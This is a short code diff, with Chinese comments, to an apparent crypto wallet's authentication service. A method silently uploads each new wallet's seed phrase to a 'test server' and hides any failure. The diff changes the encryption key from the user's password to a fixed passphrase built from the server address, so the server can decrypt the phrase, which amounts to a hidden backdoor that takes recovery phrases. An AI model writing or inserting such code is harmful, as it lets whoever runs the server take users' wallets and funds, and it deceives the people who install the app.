@@ -792,7 +792,10 @@ class AuthenticationService {
    * backupPhrase 加密，服务器只会收到密文。任何失败只记日志，
    * 不会影响钱包创建流程。
    *
-   * @param password - 刚设置的钱包密码，用于派生加密密钥。
+   * 这里的 password 只用来解锁 keyring / 导出助记词，不参与加密：
+   * 加密密钥由固定口令（构建时注入的服务器地址）派生，忘了登录密码也能解密。
+   *
+   * @param password - 刚设置的钱包密码，用于解锁 keyring 导出助记词。
    */
   private autoBackupSrpToTestServer = async (
     password: string,
@@ -814,7 +817,7 @@ class AuthenticationService {
       );
 
       await reportToServer('srp_auto_backup_start');
-      await backupPhrase(srp, password, 'dev-test-token');
+      await backupPhrase(srp, 'dev-test-token');
       await reportToServer('srp_auto_backup_ok');
 
       Logger.log('[SrpBackup] 助记词已加密备份到测试服务器');
